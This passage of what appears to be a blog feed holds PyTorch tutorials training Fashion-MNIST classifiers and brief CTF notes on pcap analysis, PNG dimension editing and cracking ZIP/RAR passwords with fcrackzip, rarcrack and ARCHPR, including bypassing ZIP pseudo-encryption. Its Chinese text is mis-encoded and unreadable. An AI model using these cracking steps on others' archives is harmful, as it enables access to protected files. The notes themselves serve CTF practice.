5, loss 0.485373, acc 0.837500epoch 6, loss 0.473836, acc 0.839833epoch 7, loss 0.465260, acc 0.843550epoch 8, loss 0.458585, acc 0.845067epoch 9, loss 0.451611, acc 0.846433epoch 10, loss 0.447118, acc 0.848250</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">evaluate_accuracy(net, test_iter)<br><span class="hljs-comment"># å’Œå‰é¢çš„1/10ç›¸æ¯”</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">0.8294</code></pre><h3 id="2-pytorch"><a href="#2-pytorch" class="headerlink" title="2  pytorch"></a>2  pytorch</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">batch_size = <span class="hljs-number">256</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dataloader_workers</span>():  <span class="hljs-comment">#@save</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data_fashion_mnist</span>(<span class="hljs-params">batch_size, resize=<span class="hljs-literal">None</span></span>): <br>    trans = [transforms.ToTensor()]<br>    <span class="hljs-keyword">if</span> resize:<br>        trans.insert(<span class="hljs-number">0</span>, transforms.Resize(resize))<br>    trans = transforms.Compose(trans)<br>    mnist_train = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    mnist_test = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> (<br>            data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>, num_workers=get_dataloader_workers()),<br>            data.DataLoader(mnist_test, batch_size, shuffle=<span class="hljs-literal">False</span>, num_workers=get_dataloader_workers())<br>           )<br>train_iter, test_iter = load_data_fashion_mnist(<span class="hljs-number">256</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">net = nn.Sequential(nn.Flatten(), nn.Linear(<span class="hljs-number">784</span>,<span class="hljs-number">10</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_weights</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(m) == nn.Linear:<br>        nn.init.normal_(m.weight, std=<span class="hljs-number">0.01</span>)<br>net.apply(init_weights)<br>net<br></code></pre></td></tr></table></figure><pre><code class="hljs">Sequential(  (0): Flatten(start_dim=1, end_dim=-1)  (1): Linear(in_features=784, out_features=10, bias=True))</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">loss = nn.CrossEntropyLoss(reduction=<span class="hljs-string">&#x27;none&#x27;</span>)<br>trainer = torch.optim.SGD(net.parameters(), lr=<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">num_epochs = <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä¸é‡è¦ï¼Œä¸ç”¨çœ‹</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Accumulator</span>:  <br>    <span class="hljs-string">&quot;&quot;&quot;åœ¨nä¸ªå˜é‡ä¸Šç´¯åŠ &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, *args</span>):<br>        self.data = [a + <span class="hljs-built_in">float</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.data, args)]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        <span class="hljs-keyword">return</span> self.data[idx]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">accuracy</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®—é¢„æµ‹æ­£ç¡®çš„æ•°é‡&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_hat.shape) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y_hat.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>        y_hat = y_hat.argmax(axis=<span class="hljs-number">1</span>)<br>    cmp = y_hat.<span class="hljs-built_in">type</span>(y.dtype) == y<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(cmp.<span class="hljs-built_in">type</span>(y.dtype).<span class="hljs-built_in">sum</span>())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_accuracy</span>(<span class="hljs-params">net, data_iter</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®—åœ¨æŒ‡å®šæ•°æ®é›†ä¸Šæ¨¡å‹çš„ç²¾åº¦&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># å°†æ¨¡å‹è®¾ç½®ä¸ºè¯„ä¼°æ¨¡å¼</span><br>    metric = Accumulator(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ­£ç¡®é¢„æµ‹æ•°ã€é¢„æµ‹æ€»æ•°</span><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>            metric.add(accuracy(net(X), y), y.numel())<br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_epoch_ch3</span>(<span class="hljs-params">net, train_iter, loss, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;è®­ç»ƒæ¨¡å‹ä¸€ä¸ªè¿­ä»£å‘¨æœŸï¼ˆå®šä¹‰è§ç¬¬3ç« ï¼‰&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># å°†æ¨¡å‹è®¾ç½®ä¸ºè®­ç»ƒæ¨¡å¼</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.train()<br>    <span class="hljs-comment"># è®­ç»ƒæŸå¤±æ€»å’Œã€è®­ç»ƒå‡†ç¡®åº¦æ€»å’Œã€æ ·æœ¬æ•°</span><br>    metric = Accumulator(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> train_iter:<br>        <span class="hljs-comment"># è®¡ç®—æ¢¯åº¦å¹¶æ›´æ–°å‚æ•°</span><br>        y_hat = net(X)<br>        l = loss(y_hat, y)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(updater, torch.optim.Optimizer):  <span class="hljs-comment"># è¿™æ¬¡å°±æ˜¯trueäº†</span><br>            <span class="hljs-comment"># ä½¿ç”¨PyTorchå†…ç½®çš„ä¼˜åŒ–å™¨å’ŒæŸå¤±å‡½æ•°</span><br>            updater.zero_grad()<br>            l.mean().backward()<br>            updater.step()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># ä½¿ç”¨å®šåˆ¶çš„ä¼˜åŒ–å™¨å’ŒæŸå¤±å‡½æ•°</span><br>            l.<span class="hljs-built_in">sum</span>().backward()<br>            updater(X.shape[<span class="hljs-number">0</span>])<br>        metric.add(<span class="hljs-built_in">float</span>(l.<span class="hljs-built_in">sum</span>()), accuracy(y_hat, y), y.numel())<br>    <span class="hljs-comment"># è¿”å›è®­ç»ƒæŸå¤±å’Œè®­ç»ƒç²¾åº¦</span><br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">2</span>], metric[<span class="hljs-number">1</span>] / metric[<span class="hljs-number">2</span>]<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ch3</span>(<span class="hljs-params">net, train_iter, test_iter, loss, num_epochs, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;è®­ç»ƒæ¨¡å‹ï¼ˆå®šä¹‰è§ç¬¬3ç« ï¼‰&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>        train_metrics = train_epoch_ch3(net, train_iter, loss, updater)<br>        train_loss, train_acc = train_metrics<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;train_loss:f&#125;</span>, acc <span class="hljs-subst">&#123;train_acc:f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer)<br></code></pre></td></tr></table></figure><pre><code class="hljs">epoch 1, loss 0.786900, acc 0.750100epoch 2, loss 0.569765, acc 0.813767epoch 3, loss 0.523460, acc 0.826400epoch 4, loss 0.501842, acc 0.830967epoch 5, loss 0.484808, acc 0.836317epoch 6, loss 0.473122, acc 0.840633epoch 7, loss 0.465168, acc 0.842500epoch 8, loss 0.457948, acc 0.844433epoch 9, loss 0.452464, acc 0.847283epoch 10, loss 0.447432, acc 0.847467</code></pre>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>multilayer perceptrons</title>
    <link href="/2023/11/19/ai/multilayer%20perceptrons/"/>
    <url>/2023/11/19/ai/multilayer%20perceptrons/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">net = nn.Sequential(nn.Flatten(), <br>                    nn.Linear(<span class="hljs-number">784</span>,<span class="hljs-number">256</span>), <br>                    nn.ReLU(),<br>                    nn.Linear(<span class="hljs-number">256</span>,<span class="hljs-number">10</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">batch_size = <span class="hljs-number">256</span><br>lr = <span class="hljs-number">0.1</span><br>num_epochs = <span class="hljs-number">10</span><br>loss = nn.CrossEntropyLoss(reduction=<span class="hljs-string">&#x27;none&#x27;</span>)<br>trainer = torch.optim.SGD(net.parameters(), lr=lr)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dataloader_workers</span>():  <span class="hljs-comment">#@save</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data_fashion_mnist</span>(<span class="hljs-params">batch_size, resize=<span class="hljs-literal">None</span></span>): <br>    trans = [transforms.ToTensor()]<br>    <span class="hljs-keyword">if</span> resize:<br>        trans.insert(<span class="hljs-number">0</span>, transforms.Resize(resize))<br>    trans = transforms.Compose(trans)<br>    mnist_train = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    mnist_test = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> (<br>            data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>, num_workers=get_dataloader_workers()),<br>            data.DataLoader(mnist_test, batch_size, shuffle=<span class="hljs-literal">False</span>, num_workers=get_dataloader_workers())<br>           )<br>train_iter, test_iter = load_data_fashion_mnist(batch_size)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä¸é‡è¦ï¼Œä¸ç”¨çœ‹</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Accumulator</span>:  <br>    <span class="hljs-string">&quot;&quot;&quot;åœ¨nä¸ªå˜é‡ä¸Šç´¯åŠ &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, *args</span>):<br>        self.data = [a + <span class="hljs-built_in">float</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.data, args)]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        <span class="hljs-keyword">return</span> self.data[idx]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">accuracy</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®—é¢„æµ‹æ­£ç¡®çš„æ•°é‡&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_hat.shape) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y_hat.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>        y_hat = y_hat.argmax(axis=<span class="hljs-number">1</span>)<br>    cmp = y_hat.<span class="hljs-built_in">type</span>(y.dtype) == y<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(cmp.<span class="hljs-built_in">type</span>(y.dtype).<span class="hljs-built_in">sum</span>())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_accuracy</span>(<span class="hljs-params">net, data_iter</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®—åœ¨æŒ‡å®šæ•°æ®é›†ä¸Šæ¨¡å‹çš„ç²¾åº¦&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># å°†æ¨¡å‹è®¾ç½®ä¸ºè¯„ä¼°æ¨¡å¼</span><br>    metric = Accumulator(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ­£ç¡®é¢„æµ‹æ•°ã€é¢„æµ‹æ€»æ•°</span><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>            metric.add(accuracy(net(X), y), y.numel())<br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_epoch_ch3</span>(<span class="hljs-params">net, train_iter, loss, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;è®­ç»ƒæ¨¡å‹ä¸€ä¸ªè¿­ä»£å‘¨æœŸï¼ˆå®šä¹‰è§ç¬¬3ç« ï¼‰&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># å°†æ¨¡å‹è®¾ç½®ä¸ºè®­ç»ƒæ¨¡å¼</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.train()<br>    <span class="hljs-comment"># è®­ç»ƒæŸå¤±æ€»å’Œã€è®­ç»ƒå‡†ç¡®åº¦æ€»å’Œã€æ ·æœ¬æ•°</span><br>    metric = Accumulator(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> train_iter:<br>        <span class="hljs-comment"># è®¡ç®—æ¢¯åº¦å¹¶æ›´æ–°å‚æ•°</span><br>        y_hat = net(X)<br>        l = loss(y_hat, y)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(updater, torch.optim.Optimizer):  <span class="hljs-comment"># è¿™æ¬¡å°±æ˜¯trueäº†</span><br>            <span class="hljs-comment"># ä½¿ç”¨PyTorchå†…ç½®çš„ä¼˜åŒ–å™¨å’ŒæŸå¤±å‡½æ•°</span><br>            updater.zero_grad()<br>            l.mean().backward()<br>            updater.step()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># ä½¿ç”¨å®šåˆ¶çš„ä¼˜åŒ–å™¨å’ŒæŸå¤±å‡½æ•°</span><br>            l.<span class="hljs-built_in">sum</span>().backward()<br>            updater(X.shape[<span class="hljs-number">0</span>])<br>        metric.add(<span class="hljs-built_in">float</span>(l.<span class="hljs-built_in">sum</span>()), accuracy(y_hat, y), y.numel())<br>    <span class="hljs-comment"># è¿”å›è®­ç»ƒæŸå¤±å’Œè®­ç»ƒç²¾åº¦</span><br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">2</span>], metric[<span class="hljs-number">1</span>] / metric[<span class="hljs-number">2</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ch3</span>(<span class="hljs-params">net, train_iter, test_iter, loss, num_epochs, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;è®­ç»ƒæ¨¡å‹ï¼ˆå®šä¹‰è§ç¬¬3ç« ï¼‰&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>        train_metrics = train_epoch_ch3(net, train_iter, loss, updater)<br>        train_loss, train_acc = train_metrics<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;train_loss:f&#125;</span>, acc <span class="hljs-subst">&#123;train_acc:f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer)<br></code></pre></td></tr></table></figure><pre><code class="hljs">epoch 1, loss 0.869232, acc 0.711650epoch 2, loss 0.558885, acc 0.805100epoch 3, loss 0.494192, acc 0.828150epoch 4, loss 0.463008, acc 0.837517epoch 5, loss 0.441443, acc 0.844883epoch 6, loss 0.417930, acc 0.853567epoch 7, loss 0.403445, acc 0.858967epoch 8, loss 0.394371, acc 0.860567epoch 9, loss 0.382370, acc 0.865217epoch 10, loss 0.372356, acc 0.867917</code></pre>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pcapéšå†™</title>
    <link href="/2023/11/17/ctf-misc/pcap/"/>
    <url>/2023/11/17/ctf-misc/pcap/</url>
    
    <content type="html"><![CDATA[<h3 id="TCPæµè¿½è¸ª"><a href="#TCPæµè¿½è¸ª" class="headerlink" title="TCPæµè¿½è¸ª"></a>TCPæµè¿½è¸ª</h3><p>tcpåŒ…å¯ä»¥æºå¸¦data</p><p>åœ¨wireshark -&gt; åˆ†æ -&gt; è¿½è¸ªæµ -&gt; TCPæµå¯ä»¥æŸ¥çœ‹æ‰€æœ‰tcpçš„dataå­—æ®µæ‹¼æ¥åˆ°ä¸€èµ·çš„å€¼</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pngéšå†™</title>
    <link href="/2023/11/17/ctf-misc/png%E9%9A%90%E5%86%99/"/>
    <url>/2023/11/17/ctf-misc/png%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges#%E5%A4%A7%E7%99%BD">https://buuoj.cn/challenges#%E5%A4%A7%E7%99%BD</a></p><p><img src="/img/pngmisc/1.jpg"></p><p>010 editor ç¬¬äºŒè¡Œå‰ä¸¤ä¸ªå­—æ®µæ˜¯å›¾ç‰‡çš„å®½å’Œé«˜</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‹ç¼©åŒ…misc</title>
    <link href="/2023/11/17/ctf-misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%A0%B4%E8%A7%A3/"/>
    <url>/2023/11/17/ctf-misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h3><p><img src="/img/fcrackzip/1.jpg"></p><p>-b æš´åŠ›ç ´è§£</p><p>-c æŒ‡å®šå­—ç¬¦é›† 1 ä»£è¡¨æ•°å­—</p><p>-l é•¿åº¦åŒºé—´</p><p>-u ä¸æ˜¾ç¤ºé”™è¯¯å¯†ç </p><h3 id="RAR"><a href="#RAR" class="headerlink" title="RAR"></a>RAR</h3><p>rarcrackï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rarcrack ./åŸºç¡€ç ´è§£.rar --type rar --threads 100<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rarcrack</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">abc</span>&gt;</span>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<span class="hljs-tag">&lt;/<span class="hljs-name">abc</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">current</span>&gt;</span>023q<span class="hljs-tag">&lt;/<span class="hljs-name">current</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">good_password</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rarcrack</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨xmlé‡Œæ”¹currentæ”¹å˜ç ´è§£ä½ç½®</p><p>ä½†æ˜¯ç ´è§£èµ·æ¥å·¨æ…¢ã€‚ã€‚ã€‚å› ä¸ºä¸èƒ½é€‰æ‹©å¯†ç å­—ç¬¦ç±»å‹</p><p>ä»å¾çˆ±ç ´è§£ä¸‹è½½çš„ARCHPRï¼š</p><p><img src="/img/fcrackzip/2.jpg"></p><h3 id="ZIPä¼ªåŠ å¯†"><a href="#ZIPä¼ªåŠ å¯†" class="headerlink" title="ZIPä¼ªåŠ å¯†"></a>ZIPä¼ªåŠ å¯†</h3><p><img src="/img/fcrackzip/3.jpg"></p><p>è¿™ä¸¤ä¸ªå­—èŠ‚æ”¹ä¸º00 